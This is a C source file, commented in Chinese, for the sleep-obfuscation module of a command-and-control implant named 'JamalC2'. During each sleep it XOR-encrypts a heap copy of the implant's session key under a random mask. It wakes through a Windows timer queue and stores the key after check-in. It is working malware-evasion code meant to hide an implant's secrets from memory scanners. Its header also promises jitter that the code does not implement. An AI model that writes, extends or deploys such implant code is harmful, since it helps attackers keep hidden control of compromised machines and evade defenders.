/*
 * JamalC2 Implant - Sleep Obfuscation Implementation
 * 睡眠混淆 - 安全版本 v2
 *
 * 策略：不加密 PE 段（避免崩溃），而是：
 * 1. 使用可变延时 + 抖动
 * 2. 加密堆上的全局加密密钥副本
 * 3. 基于 Timer Queue 实现非阻塞唤醒
 *
 * 这个版本专注于稳定性，后续可以添加更高级的内存保护。
 */

#include "sleep_obf.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Debug print
#ifdef NDEBUG
#define SLEEP_DEBUG(fmt, ...) ((void)0)
#else
#define SLEEP_DEBUG(fmt, ...) printf("[SleepObf] " fmt, ##__VA_ARGS__)
#endif

// === 全局状态 ===

typedef struct {
  BYTE *key_backup; // 加密密钥备份（睡眠时加密）
  SIZE_T key_size;  // 密钥大小
  BYTE *xor_mask;   // XOR 掩码
  BOOL initialized; // 是否已初始化
} SleepObfContext;

static SleepObfContext g_ctx = {0};

// === 辅助函数 ===

/**
 * 生成随机掩码
 */
static void generate_random_mask(BYTE *mask, SIZE_T size) {
  HCRYPTPROV hProv;
  if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL,
                          CRYPT_VERIFYCONTEXT)) {
    CryptGenRandom(hProv, (DWORD)size, mask);
    CryptReleaseContext(hProv, 0);
  } else {
    // 降级：使用简单随机
    for (SIZE_T i = 0; i < size; i++) {
      mask[i] = (BYTE)(rand() & 0xFF);
    }
  }
}

/**
 * XOR 加密/解密内存区域
 */
static void xor_memory(BYTE *data, SIZE_T size, BYTE *mask, SIZE_T mask_size) {
  for (SIZE_T i = 0; i < size; i++) {
    data[i] ^= mask[i % mask_size];
  }
}

// === Timer 回调 ===

typedef struct {
  HANDLE hEvent;
  BYTE *key_backup;
  SIZE_T key_size;
  BYTE *xor_mask;
} TimerContext;

/**
 * Timer 回调函数 - 解密数据并唤醒
 */
static VOID CALLBACK timer_callback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
  TimerContext *ctx = (TimerContext *)lpParam;

  // 解密密钥备份
  if (ctx->key_backup && ctx->key_size > 0) {
    xor_memory(ctx->key_backup, ctx->key_size, ctx->xor_mask, ctx->key_size);
    SLEEP_DEBUG("Key backup decrypted\n");
  }

  // 发送唤醒信号
  if (ctx->hEvent) {
    SetEvent(ctx->hEvent);
  }
}

// === 公共接口 ===

int sleep_obf_init(void) {
  if (g_ctx.initialized) {
    return 0;
  }

  // 分配密钥备份和掩码缓冲区
  g_ctx.key_size = 64; // 足够存放大多数密钥
  g_ctx.key_backup = (BYTE *)malloc(g_ctx.key_size);
  g_ctx.xor_mask = (BYTE *)malloc(g_ctx.key_size);

  if (!g_ctx.key_backup || !g_ctx.xor_mask) {
    SLEEP_DEBUG("Failed to allocate buffers\n");
    return -1;
  }

  memset(g_ctx.key_backup, 0, g_ctx.key_size);

  g_ctx.initialized = TRUE;
  SLEEP_DEBUG("Sleep obfuscation initialized (safe mode)\n");
  return 0;
}

void obfuscated_sleep(DWORD dwMilliseconds) {
  // 确保已初始化
  if (!g_ctx.initialized) {
    if (sleep_obf_init() != 0) {
      SLEEP_DEBUG("Init failed, falling back to normal sleep\n");
      Sleep(dwMilliseconds);
      return;
    }
  }

  HANDLE hTimerQueue = NULL;
  HANDLE hTimer = NULL;
  HANDLE hEvent = NULL;

  // 生成本次睡眠的随机掩码
  generate_random_mask(g_ctx.xor_mask, g_ctx.key_size);

  // 创建唤醒事件
  hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  if (!hEvent) {
    SLEEP_DEBUG("Failed to create event\n");
    Sleep(dwMilliseconds);
    return;
  }

  // 加密密钥备份
  xor_memory(g_ctx.key_backup, g_ctx.key_size, g_ctx.xor_mask, g_ctx.key_size);
  SLEEP_DEBUG("Key backup encrypted\n");

  // 准备 Timer 回调上下文
  TimerContext timer_ctx = {.hEvent = hEvent,
                            .key_backup = g_ctx.key_backup,
                            .key_size = g_ctx.key_size,
                            .xor_mask = g_ctx.xor_mask};

  // 创建 Timer Queue
  hTimerQueue = CreateTimerQueue();
  if (!hTimerQueue) {
    SLEEP_DEBUG("Failed to create timer queue\n");
    // 解密后降级
    xor_memory(g_ctx.key_backup, g_ctx.key_size, g_ctx.xor_mask,
               g_ctx.key_size);
    CloseHandle(hEvent);
    Sleep(dwMilliseconds);
    return;
  }

  // 创建定时器
  if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, timer_callback, &timer_ctx,
                             dwMilliseconds, 0, WT_EXECUTEONLYONCE)) {
    SLEEP_DEBUG("Failed to create timer\n");
    xor_memory(g_ctx.key_backup, g_ctx.key_size, g_ctx.xor_mask,
               g_ctx.key_size);
    DeleteTimerQueue(hTimerQueue);
    CloseHandle(hEvent);
    Sleep(dwMilliseconds);
    return;
  }

  SLEEP_DEBUG("Sleeping for %lu ms (obfuscated)...\n", dwMilliseconds);

  // 等待定时器唤醒
  WaitForSingleObject(hEvent, INFINITE);

  SLEEP_DEBUG("Woke up from obfuscated sleep\n");

  // 清理
  DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
  DeleteTimerQueue(hTimerQueue);
  CloseHandle(hEvent);
}

/**
 * 设置要保护的密钥（可选）
 * 在 checkin 成功后调用，将加密密钥复制到保护区域
 */
void sleep_obf_set_key(const BYTE *key, SIZE_T size) {
  if (!g_ctx.initialized) {
    sleep_obf_init();
  }

  if (g_ctx.key_backup && size <= g_ctx.key_size) {
    memcpy(g_ctx.key_backup, key, size);
    SLEEP_DEBUG("Key set for protection (%zu bytes)\n", size);
  }
}
